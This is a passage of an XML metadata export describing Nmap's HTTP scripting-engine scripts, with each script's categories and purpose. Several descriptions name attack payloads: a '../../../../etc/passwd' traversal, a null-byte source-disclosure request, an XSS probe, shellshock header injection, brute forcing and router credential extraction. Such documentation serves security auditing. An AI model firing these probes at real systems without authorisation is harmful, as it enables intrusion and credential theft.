<description>Enumerates directories used by popular web applications and servers.&#xa;&#xa;This parses a fingerprint file that&apos;s similar in format to the Nikto Web application&#xa;scanner. This script, however, takes it one step further by building in advanced pattern matching as well&#xa;as having the ability to identify specific versions of Web applications.&#xa;&#xa;You can also parse a Nikto-formatted database using http-fingerprints.nikto-db-path. This will try to parse&#xa;most of the fingerprints defined in nikto&apos;s database in real time. More documentation about this in the&#xa;nselib/data/http-fingerprints.lua file.&#xa;&#xa;Currently, the database can be found under Nmap&apos;s directory in the nselib/data folder. The file is called&#xa;http-fingerprints and has a long description of its functionality in the file header.&#xa;&#xa;Many of the finger prints were discovered by me (Ron Bowes), and a number of them are from the Yokoso&#xa;project, used with permission from Kevin Johnson (http://seclists.org/nmap-dev/2009/q3/0685.html).&#xa;&#xa;Initially, this script attempts to access two different random files in order to detect servers&#xa;that don&apos;t return a proper 404 Not Found status. In the event that they return 200 OK, the body&#xa;has any non-static-looking data removed (URI, time, etc), and saved. If the two random attempts&#xa;return different results, the script aborts (since a 200-looking 404 cannot be distinguished from&#xa;an actual 200). This will prevent most false positives.&#xa;&#xa;In addition, if the root folder returns a 301 Moved Permanently or 401 Authentication Required,&#xa;this script will also abort. If the root folder has disappeared or requires authentication, there&#xa;is little hope of finding anything inside it.&#xa;&#xa;By default, only pages that return 200 OK or 401 Authentication Required are displayed. If the&#xa;&lt;code&gt;http-enum.displayall&lt;/code&gt; script argument is set, however, then all results will be displayed (except&#xa;for 404 Not Found and the status code returned by the random files). Entries in the http-fingerprints&#xa;database can specify their own criteria for accepting a page as valid.&#xa;&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-errors.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>This script crawls through the website and returns any error pages.&#xa;&#xa;The script will return all pages (sorted by error code) that respond with an&#xa;http code equal or above 400. To change this behaviour, please use the&#xa;&lt;code&gt;errcodes&lt;/code&gt; option.&#xa;&#xa;The script, by default, spiders and searches within forty pages. For large web&#xa;applications make sure to increase httpspider&apos;s &lt;code&gt;maxpagecount&lt;/code&gt; value.&#xa;Please, note that the script will become more intrusive though.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-exif-spider.nse">
<categories><category>intrusive</category></categories>
<description>Spiders a site&apos;s images looking for interesting exif data embedded in&#xa;.jpg files. Displays the make and model of the camera, the date the photo was&#xa;taken, and the embedded geotag information.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-favicon.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Gets the favicon (&quot;favorites icon&quot;) from a web page and matches it against a&#xa;database of the icons of known web applications. If there is a match, the name&#xa;of the application is printed; otherwise the MD5 hash of the icon data is&#xa;printed.&#xa;&#xa;If the script argument &lt;code&gt;favicon.uri&lt;/code&gt; is given, that relative URI is&#xa;always used to find the favicon. Otherwise, first the page at the root of the&#xa;web server is retrieved and parsed for a &lt;code&gt;&lt;link rel=&quot;icon&quot;&gt;&lt;/code&gt;&#xa;element. If that fails, the icon is looked for in &lt;code&gt;/favicon.ico&lt;/code&gt;. If&#xa;a &lt;code&gt;&lt;link&gt;&lt;/code&gt; favicon points to a different host or port, it is ignored.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-feed.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>This script crawls through the website to find any rss or atom feeds.&#xa;&#xa;The script, by default, spiders and searches within forty pages. For large web&#xa;applications make sure to increase httpspider&apos;s &lt;code&gt;maxpagecount&lt;/code&gt; value.&#xa;Please, note that the script will become more intrusive though.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-fetch.nse">
<categories><category>safe</category></categories>
<description>The script is used to fetch files from servers.&#xa;&#xa;The script supports three different use cases:&#xa;* The paths argument isn&apos;t provided, the script spiders the host&#xa;  and downloads files in their respective folders relative to&#xa;  the one provided using &quot;destination&quot;.&#xa;* The paths argument(a single item or list) is provided and the path starts&#xa;  with &quot;/&quot;, the script tries to fetch the path relative to the url&#xa;  provided via the argument &quot;url&quot;.&#xa;* The paths argument(a single item or list) is provided and the path doesn&apos;t&#xa;  start with &quot;/&quot;. Then the script spiders the host and tries to find&#xa;  files which contain the path(now treated as a pattern).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-fileupload-exploiter.nse">
<categories><category>intrusive</category><category>exploit</category><category>vuln</category></categories>
<description>Exploits insecure file upload forms in web applications&#xa;using various techniques like changing the Content-type&#xa;header or creating valid image files containing the&#xa;payload in the comment.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-form-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force password auditing against http form-based authentication.&#xa;&#xa;This script uses the unpwdb and brute libraries to perform password&#xa;guessing. Any successful guesses are stored in the nmap registry, using&#xa;the creds library, for other scripts to use.&#xa;&#xa;The script automatically attempts to discover the form method, action, and&#xa;field names to use in order to perform password guessing. (Use argument&#xa;path to specify the page where the form resides.) If it fails doing so&#xa;the form components can be supplied using arguments method, path, uservar,&#xa;and passvar. The same arguments can be used to selectively override&#xa;the detection outcome.&#xa;&#xa;The script contains a small database of known web apps&apos; form information. This&#xa;improves form detection and also allows for form mangling and custom success&#xa;detection functions. If the script arguments aren&apos;t expressive enough, users&#xa;are encouraged to edit the database to fit.&#xa;&#xa;After attempting to authenticate using a HTTP GET or POST request the script&#xa;analyzes the response and attempts to determine whether authentication was&#xa;successful or not. The script analyzes this by checking the response using&#xa;the following rules:&#xa;&#xa;1. If the response was empty the authentication was successful.&#xa;2. If the onsuccess argument was provided then the authentication either&#xa;   succeeded or failed depending on whether the response body contained&#xa;   the message/pattern passed in the onsuccess argument.&#xa;3. If no onsuccess argument was passed, and if the onfailure argument&#xa;   was provided then the authentication either succeeded or failed&#xa;   depending on whether the response body does not contain&#xa;   the message/pattern passed in the onfailure argument.&#xa;4. If neither the onsuccess nor onfailure argument was passed and the&#xa;   response contains a form field named the same as the submitted&#xa;   password parameter then the authentication failed.&#xa;5. Authentication was successful.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-form-fuzzer.nse">
<categories><category>fuzzer</category><category>intrusive</category></categories>
<description>Performs a simple form fuzzing against forms found on websites.&#xa;Tries strings and numbers of increasing length and attempts to&#xa;determine if the fuzzing was successful.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-frontpage-login.nse">
<categories><category>vuln</category><category>safe</category></categories>
<description>Checks whether target machines are vulnerable to anonymous Frontpage login.&#xa;&#xa;Older, default configurations of Frontpage extensions allow&#xa;remote user to login anonymously which may lead to server compromise.&#xa;&#xa; </description>
</script>
<script filename="E:\Software\Nmap/scripts\http-generator.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Displays the contents of the &quot;generator&quot; meta tag of a web page (default: /)&#xa;if there is one.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-git.nse">
<categories><category>default</category><category>safe</category><category>vuln</category></categories>
<description>Checks for a Git repository found in a website&apos;s document root&#xa;/.git/&lt;something&gt;) and retrieves as much repo information as&#xa;possible, including language/framework, remotes, last commit&#xa;message, and repository description.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-gitweb-projects-enum.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Retrieves a list of Git projects, owners and descriptions from a gitweb (web interface to the Git revision control system).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-google-malware.nse">
<categories><category>malware</category><category>discovery</category><category>safe</category><category>external</category></categories>
<description>Checks if hosts are on Google&apos;s blacklist of suspected malware and phishing&#xa;servers. These lists are constantly updated and are part of Google&apos;s Safe&#xa;Browsing service.&#xa;&#xa;To do this the script queries the Google&apos;s Safe Browsing service and you need&#xa;to have your own API key to access Google&apos;s Safe Browsing Lookup services. Sign&#xa;up for yours at http://code.google.com/apis/safebrowsing/key_signup.html&#xa;&#xa;* To learn more about Google&apos;s Safe Browsing:&#xa;http://code.google.com/apis/safebrowsing/&#xa;&#xa;* To register and get your personal API key:&#xa;http://code.google.com/apis/safebrowsing/key_signup.html&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-grep.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Spiders a website and attempts to match all pages and urls against a given&#xa;string. Matches are counted and grouped per url under which they were&#xa;discovered.&#xa;&#xa;Features built in patterns like email, ip, ssn, discover, amex and more.&#xa;The script searches for email and ip by default.&#xa;&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-headers.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Performs a HEAD request for the root folder (&quot;/&quot;) of a web server and displays the HTTP headers returned.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-hp-ilo-info.nse">
<categories><category>safe</category><category>discovery</category></categories>
<description>Attempts to extract information from HP iLO boards including versions and addresses.&#xa;&#xa;HP iLO boards have an unauthenticated info disclosure at &lt;ip&gt;/xmldata?item=all.&#xa;It lists board informations such as server model, firmware version,&#xa;MAC addresses, IP addresses, etc. This script uses the slaxml library&#xa;to parse the iLO xml file and display the info.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-huawei-hg5xx-vuln.nse">
<categories><category>exploit</category><category>vuln</category></categories>
<description>Detects Huawei modems models HG530x, HG520x, HG510x (and possibly others...)&#xa;vulnerable to a remote credential and information disclosure vulnerability. It&#xa;also extracts the PPPoE credentials and other interesting configuration values.&#xa;&#xa;Attackers can query the URIs &quot;/Listadeparametros.html&quot; and &quot;/wanfun.js&quot; to&#xa;extract sensitive information including PPPoE credentials, firmware version,&#xa;model, gateway, dns servers and active connections among other values.&#xa;&#xa;This script exploits two vulnerabilities. One was discovered and reported by&#xa;Adiaz from Comunidad Underground de Mexico (http://underground.org.mx) and it&#xa;allows attackers to extract the pppoe password. The configuration disclosure&#xa;vulnerability was discovered by Pedro Joaquin (http://hakim.ws).&#xa;&#xa;References:&#xa;* http://websec.ca/advisories/view/Huawei-HG520c-3.10.18.x-information-disclosure&#xa;* http://routerpwn.com/#huawei&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-icloud-findmyiphone.nse">
<categories><category>discovery</category><category>safe</category><category>external</category></categories>
<description>Retrieves the locations of all &quot;Find my iPhone&quot; enabled iOS devices by querying&#xa;the MobileMe web service (authentication required).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-icloud-sendmsg.nse">
<categories><category>discovery</category><category>safe</category><category>external</category></categories>
<description>Sends a message to a iOS device through the Apple MobileMe web service. The&#xa;device has to be registered with an Apple ID using the Find My Iphone&#xa;application.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-iis-short-name-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Attempts to brute force the 8.3 filenames (commonly known as short names) of files and directories in the root folder&#xa;of vulnerable IIS servers. This script is an implementation of the PoC &quot;iis shortname scanner&quot;.&#xa;&#xa;The script uses ~,? and * to bruteforce the short name of files present in the IIS document root.&#xa;Short names have a restriction of 6 character file name followed by a three character extension.&#xa;&#xa;Notes:&#xa;* The script might have to be run twice (according to the original author).&#xa;* Tested against IIS 6.0 and 5.1.&#xa;&#xa;References:&#xa;* Research paper: http://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf&#xa;* IIS Shortname Scanner PoC: https://github.com/irsdl/IIS-ShortName-Scanner&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-iis-webdav-vuln.nse">
<categories><category>vuln</category><category>intrusive</category></categories>
<description>Checks for a vulnerability in IIS 5.1/6.0 that allows arbitrary users to access&#xa;secured WebDAV folders by searching for a password-protected folder and&#xa;attempting to access it. This vulnerability was patched in Microsoft Security&#xa;Bulletin MS09-020, https://nmap.org/r/ms09-020.&#xa;&#xa;A list of well known folders (almost 900) is used by default. Each one is&#xa;checked, and if returns an authentication request (401), another attempt is&#xa;tried with the malicious encoding. If that attempt returns a successful result&#xa;(207), then the folder is marked as vulnerable.&#xa;&#xa;This script is based on the Metasploit auxiliary module&#xa;auxiliary/scanner/http/wmap_dir_webdav_unicode_bypass&#xa;&#xa;For more information on this vulnerability and script, see:&#xa;* http://blog.zoller.lu/2009/05/iis-6-webdac-auth-bypass-and-data.html&#xa;* http://seclists.org/fulldisclosure/2009/May/att-134/IIS_Advisory_pdf.bin&#xa;* http://www.skullsecurity.org/blog/?p=271&#xa;* http://www.kb.cert.org/vuls/id/787932&#xa;* http://www.microsoft.com/technet/security/advisory/971492.mspx&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-internal-ip-disclosure.nse">
<categories><category>vuln</category><category>discovery</category><category>safe</category></categories>
<description>Determines if the web server leaks its internal IP address when sending an HTTP/1.0 request without a Host header.&#xa;&#xa;Some misconfigured web servers leak their internal IP address in the response&#xa;headers when returning a redirect response. This is a known issue for some&#xa;versions of Microsoft IIS, but affects other web servers as well.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-joomla-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force password auditing against Joomla web CMS installations.&#xa;&#xa;This script initially reads the session cookie and parses the security token to perfom the brute force password auditing.&#xa;It uses the unpwdb and brute libraries to perform password guessing. Any successful guesses are stored using the&#xa;credentials library.&#xa;&#xa;Joomla&apos;s default uri and form names:&#xa;* Default uri:&lt;code&gt;/administrator/index.php&lt;/code&gt;&#xa;* Default uservar: &lt;code&gt;username&lt;/code&gt;&#xa;* Default passvar: &lt;code&gt;passwd&lt;/code&gt;&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-jsonp-detection.nse">
<categories><category>safe</category><category>vuln</category><category>discovery</category></categories>
<description>Attempts to discover JSONP endpoints in web servers. JSONP endpoints can be&#xa;used to bypass Same-origin Policy restrictions in web browsers.&#xa;&#xa;The script searches for callback functions in the response to detect JSONP&#xa;endpoints. It also tries to determine callback function through URL(callback&#xa;function may be fully or partially controllable from URL) and also tries to&#xa;bruteforce the most common callback variables through the URL.&#xa;&#xa;References : https://securitycafe.ro/2017/01/18/practical-jsonp-injection/&#xa;&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-litespeed-sourcecode-download.nse">
<categories><category>vuln</category><category>intrusive</category><category>exploit</category></categories>
<description>Exploits a null-byte poisoning vulnerability in Litespeed Web Servers 4.0.x&#xa;before 4.0.15 to retrieve the target script&apos;s source code by sending a HTTP&#xa;request with a null byte followed by a .txt file extension (CVE-2010-2333).&#xa;&#xa;If the server is not vulnerable it returns an error 400. If index.php is not&#xa;found, you may try /phpinfo.php which is also shipped with LiteSpeed Web&#xa;Server. The attack payload looks like this:&#xa;* &lt;code&gt;/index.php\00.txt&lt;/code&gt;&#xa;&#xa;References:&#xa;* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2333&#xa;* http://www.exploit-db.com/exploits/13850/&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-ls.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Shows the content of an &quot;index&quot; Web page.&#xa;&#xa;TODO:&#xa;  - add support for more page formats&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-majordomo2-dir-traversal.nse">
<categories><category>intrusive</category><category>vuln</category><category>exploit</category></categories>
<description>Exploits a directory traversal vulnerability existing in Majordomo2 to retrieve remote files. (CVE-2011-0049).&#xa;&#xa;Vulnerability originally discovered by Michael Brooks.&#xa;&#xa;For more information about this vulnerability:&#xa;* http://www.mj2.org/&#xa;* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0049&#xa;* http://www.exploit-db.com/exploits/16103/&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-malware-host.nse">
<categories><category>malware</category><category>safe</category></categories>
<description>Looks for signature of known server compromises.&#xa;&#xa;Currently, the only signature it looks for is the one discussed here:&#xa;http://blog.unmaskparasites.com/2009/09/11/dynamic-dns-and-botnet-of-zombie-web-servers/.&#xa;This is done by requesting the page &lt;code&gt;/ts/in.cgi?open2&lt;/code&gt; and&#xa;looking for an errant 302 (it attempts to detect servers that always&#xa;return 302). Thanks to Denis from the above link for finding this&#xa;technique!&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-mcmp.nse">
<categories><category>safe</category><category>discovery</category></categories>
<description>Checks if the webserver allows mod_cluster management protocol (MCMP) methods.&#xa;&#xa;The script sends a MCMP PING message to determine protocol support, then issues&#xa;the DUMP command to dump the current configuration seen by mod_cluster_manager.&#xa;&#xa;References:&#xa;&#xa;* https://developer.jboss.org/wiki/Mod-ClusterManagementProtocol&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-method-tamper.nse">
<categories><category>auth</category><category>vuln</category></categories>
<description>Attempts to bypass password protected resources (HTTP 401 status) by performing HTTP verb tampering.&#xa;If an array of paths to check is not set, it will crawl the web server and perform the check against any&#xa;password protected resource that it finds.&#xa;&#xa;The script determines if the protected URI is vulnerable by performing HTTP verb tampering and monitoring&#xa; the status codes. First, it uses a HEAD request, then a POST request and finally a random generated string&#xa;( This last one is useful when web servers treat unknown request methods as a GET request. This is the case&#xa; for PHP servers ).&#xa;&#xa;If the table &lt;code&gt;paths&lt;/code&gt; is set, it will attempt to access the given URIs. Otherwise, a web crawler&#xa;is initiated to try to find protected resources. Note that in a PHP environment with .htaccess files you need to specify a&#xa;path to a file rather than a directory to find misconfigured .htaccess files.&#xa;&#xa;References:&#xa;* http://www.imperva.com/resources/glossary/http_verb_tampering.html&#xa;* https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29&#xa;* http://www.mkit.com.ar/labs/htexploit/&#xa;* http://capec.mitre.org/data/definitions/274.html&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-methods.nse">
<categories><category>default</category><category>safe</category></categories>
<description>Finds out what options are supported by an HTTP server by sending an&#xa;OPTIONS request. Lists potentially risky methods. It tests those methods&#xa;not mentioned in the OPTIONS headers individually and sees if they are&#xa;implemented. Any output other than 501/405 suggests that the method is&#xa;if not in the range 400 to 600. If the response falls under that range then&#xa;it is compared to the response from a randomly generated method.&#xa;&#xa;In this script, &quot;potentially risky&quot; methods are anything except GET,&#xa;HEAD, POST, and OPTIONS. If the script reports potentially risky&#xa;methods, they may not all be security risks, but you should check to&#xa;make sure. This page lists the dangers of some common methods:&#xa;&#xa;http://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29&#xa;&#xa;The list of supported methods comes from the contents of the Allow and&#xa;Public header fields. In verbose mode, a list of all methods is printed,&#xa;followed by the list of potentially risky methods. Without verbose mode,&#xa;only the potentially risky methods are shown.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-mobileversion-checker.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Checks if the website holds a mobile version.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-ntlm-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>This script enumerates information from remote HTTP services with NTLM&#xa;authentication enabled.&#xa;&#xa;By sending a HTTP NTLM authentication request with null domain and user&#xa;credentials (passed in the &apos;Authorization&apos; header), the remote service will&#xa;respond with a NTLMSSP message (encoded within the &apos;WWW-Authenticate&apos; header)&#xa;and disclose information to include NetBIOS, DNS, and OS build version if&#xa;available.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-open-proxy.nse">
<categories><category>default</category><category>discovery</category><category>external</category><category>safe</category></categories>
<description>Checks if an HTTP proxy is open.&#xa;&#xa;The script attempts to connect to www.google.com through the proxy and&#xa;checks for a valid HTTP response code. Valid HTTP response codes are&#xa;200, 301, and 302. If the target is an open proxy, this script causes&#xa;the target to retrieve a web page from www.google.com.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-open-redirect.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>Spiders a website and attempts to identify open redirects. Open&#xa;redirects are handlers which commonly take a URL as a parameter and&#xa;responds with a HTTP redirect (3XX) to the target.  Risks of open redirects are&#xa;described at http://cwe.mitre.org/data/definitions/601.html.&#xa;&#xa;Only open redirects that are directly linked on the target website can be&#xa;discovered this way. If an open redirector is not linked, it will not be&#xa;discovered.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-passwd.nse">
<categories><category>intrusive</category><category>vuln</category></categories>
<description>Checks if a web server is vulnerable to directory traversal by attempting to&#xa;retrieve &lt;code&gt;/etc/passwd&lt;/code&gt; or &lt;code&gt;\boot.ini&lt;/code&gt;.&#xa;&#xa;The script uses several technique:&#xa;* Generic directory traversal by requesting paths like &lt;code&gt;../../../../etc/passwd&lt;/code&gt;.&#xa;* Known specific traversals of several web servers.&#xa;* Query string traversal. This sends traversals as query string parameters to paths that look like they refer to a local file name. The potential query is searched for in at the path controlled by the script argument &lt;code&gt;http-passwd.root&lt;/code&gt;.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-php-version.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Attempts to retrieve the PHP version from a web server. PHP has a number&#xa;of magic queries that return images or text that can vary with the PHP&#xa;version. This script uses the following queries:&#xa;* &lt;code&gt;/?=PHPE9568F36-D428-11d2-A769-00AA001ACF42&lt;/code&gt;: gets a GIF logo, which changes on April Fool&apos;s Day.&#xa;* &lt;code&gt;/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000&lt;/code&gt;: gets an HTML credits page.&#xa;&#xa;A list of magic queries is at http://www.0php.com/php_easter_egg.php.&#xa;The script also checks if any header field value starts with&#xa;&lt;code&gt;&quot;PHP&quot;&lt;/code&gt; and reports that value if found.&#xa;&#xa;PHP versions after 5.5.0 do not respond to these queries.&#xa;&#xa;Link:&#xa;* http://phpsadness.com/sad/11&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-phpmyadmin-dir-traversal.nse">
<categories><category>vuln</category><category>exploit</category></categories>
<description>Exploits a directory traversal vulnerability in phpMyAdmin 2.6.4-pl1 (and&#xa;possibly other versions) to retrieve remote files on the web server.&#xa;&#xa;Reference:&#xa;* http://www.exploit-db.com/exploits/1244/&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-phpself-xss.nse">
<categories><category>fuzzer</category><category>intrusive</category><category>vuln</category></categories>
<description>Crawls a web server and attempts to find PHP files vulnerable to reflected&#xa;cross site scripting via the variable &lt;code&gt;$_SERVER[&quot;PHP_SELF&quot;]&lt;/code&gt;.&#xa;&#xa;This script crawls the webserver to create a list of PHP files and then sends&#xa;an attack vector/probe to identify PHP_SELF cross site scripting&#xa;vulnerabilities.  PHP_SELF XSS refers to reflected cross site scripting&#xa;vulnerabilities caused by the lack of sanitation of the variable&#xa;&lt;code&gt;$_SERVER[&quot;PHP_SELF&quot;]&lt;/code&gt; in PHP scripts. This variable is commonly&#xa;used in PHP scripts that display forms and when the script file name  is&#xa;needed.&#xa;&#xa;Examples of Cross Site Scripting vulnerabilities in the variable $_SERVER[PHP_SELF]:&#xa;* http://www.securityfocus.com/bid/37351&#xa;* http://software-security.sans.org/blog/2011/05/02/spot-vuln-percentage&#xa;* http://websec.ca/advisories/view/xss-vulnerabilities-mantisbt-1.2.x&#xa;&#xa;The attack vector/probe used is: &lt;code&gt;/&apos;&quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/code&gt;&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-proxy-brute.nse">
<categories><category>brute</category><category>intrusive</category><category>external</category></categories>
<description>Performs brute force password guessing against HTTP proxy servers.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-put.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>Uploads a local file to a remote web server using the HTTP PUT method. You must specify the filename and URL path with NSE arguments.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-qnap-nas-info.nse">
<categories><category>safe</category><category>discovery</category></categories>
<description>Attempts to retrieve the model, firmware version, and enabled services from a&#xa;QNAP Network Attached Storage (NAS) device.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-referer-checker.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Informs about cross-domain include of scripts. Websites that include&#xa;external javascript scripts are delegating part of their security to&#xa;third-party entities.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-rfi-spider.nse">
<categories><category>intrusive</category></categories>
<description>Crawls webservers in search of RFI (remote file inclusion) vulnerabilities. It&#xa;tests every form field it finds and every parameter of a URL containing a&#xa;query.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-robots.txt.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Checks for disallowed entries in &lt;code&gt;/robots.txt&lt;/code&gt; on a web server.&#xa;&#xa;The higher the verbosity or debug level, the more disallowed entries are shown.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-robtex-reverse-ip.nse">
<categories><category>discovery</category><category>safe</category><category>external</category></categories>
<description>Obtains up to 100 forward DNS names for a target IP address by querying the Robtex service (https://www.robtex.com/ip-lookup/).&#xa;&#xa;*TEMPORARILY DISABLED* due to changes in Robtex&apos;s API. See https://www.robtex.com/api/&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-robtex-shared-ns.nse">
<categories><category>discovery</category><category>safe</category><category>external</category></categories>
<description>Finds up to 100 domain names which use the same name server as the target by querying the Robtex service at http://www.robtex.com/dns/.&#xa;&#xa;The target must be specified by DNS name, not IP address.&#xa;&#xa;*TEMPORARILY DISABLED* due to changes in Robtex&apos;s API. See https://www.robtex.com/api/&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-sap-netweaver-leak.nse">
<categories><category>safe</category><category>discovery</category></categories>
<description>Detects SAP Netweaver Portal instances that allow anonymous access to the&#xa; KM unit navigation page. This page leaks file names, ldap users, etc.&#xa;&#xa;SAP Netweaver Portal with the Knowledge Management Unit enable allows unauthenticated&#xa;users to list file system directories through the URL &apos;/irj/go/km/navigation?Uri=/&apos;.&#xa;&#xa;This issue has been reported and won&apos;t be fixed.&#xa;&#xa;References:&#xa;* https://help.sap.com/saphelp_nw73ehp1/helpdata/en/4a/5c004250995a6ae10000000a42189b/frameset.htm&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-security-headers.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Checks for the HTTP response headers related to security given in OWASP Secure Headers Project&#xa;and gives a brief description of the header and its configuration value.&#xa;&#xa;The script requests the server for the header with http.head and parses it to list headers founds with their&#xa;configurations. The script checks for HSTS(HTTP Strict Transport Security), HPKP(HTTP Public Key Pins),&#xa;X-Frame-Options, X-XSS-Protection, X-Content-Type-Options, Content-Security-Policy,&#xa;X-Permitted-Cross-Domain-Policies, Set-Cookie, Expect-CT, Cache-Control, Pragma and Expires.&#xa;&#xa;References: https://www.owasp.org/index.php/OWASP_Secure_Headers_Project&#xa;https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers&#xa;&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-server-header.nse">
<categories><category>version</category></categories>
<description>Uses the HTTP Server header for missing version info. This is currently&#xa;infeasible with version probes because of the need to match non-HTTP services&#xa;correctly.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-shellshock.nse">
<categories><category>exploit</category><category>vuln</category><category>intrusive</category></categories>
<description>Attempts to exploit the &quot;shellshock&quot; vulnerability (CVE-2014-6271 and&#xa;CVE-2014-7169) in web applications.&#xa;&#xa;To detect this vulnerability the script executes a command that prints a random&#xa;string and then attempts to find it inside the response body. Web apps that&#xa;don&apos;t print back information won&apos;t be detected with this method.&#xa;&#xa;By default the script injects the payload in the HTTP headers User-Agent,&#xa;Cookie, and Referer.&#xa;&#xa;Vulnerability originally discovered by Stephane Chazelas.&#xa;&#xa;References:&#xa;* http://www.openwall.com/lists/oss-security/2014/09/24/10&#xa;* http://seclists.org/oss-sec/2014/q3/685&#xa;* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169&#xa;* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-sitemap-generator.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>Spiders a web server and displays its directory structure along with&#xa;number and types of files in each folder. Note that files listed as&#xa;having an &apos;Other&apos; extension are ones that have no extension or that&#xa;are a root document.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\http-slowloris-check.nse">
<categories><category>vuln</category><category>safe</category></categories>
<description>Tests a web server for vulnerability to the Slowloris DoS attack without&#xa;actually launching a DoS attack.&#xa;&#xa;Slowloris was described at Defcon 17 by RSnake&#xa;(see http://ha.ckers.org/slowloris/).&#xa;&#xa;This script opens two connections to the server, each without the final CRLF.&#xa;After 10 seconds, second connection sends additional header. Both connections&#xa;then wait for server timeout.  If second connection gets a timeout 10 or more&#xa;seconds after the first one, we can conclude that sending additional header&#xa;prolonged its timeout and that the server is vulnerable to slowloris DoS&#xa;attack.&#xa;&#xa;A &quot;LIKELY VULNERABLE&quot; result means a server is subject to timeout-extension&#xa;attack, but depending on the http server&apos;s architecture and resource limits, a&#xa;full denial-of-service is not always possible. Complete testing requires&#xa;triggering the actual DoS condition and measuring server responsiveness.&#xa;&#xa;You can specify custom http User-agent field with &lt;code&gt;http.useragent&lt;/code&gt;&#xa;script argument.&#xa;&#xa;Idea from Qualys blogpost:&#xa;* https://community.qualys.com/blogs/securitylabs/2011/07/07/identifying-slow-http-attack-vulnerabilities-on-web-applications&#xa;&#xa;</description>
</script>
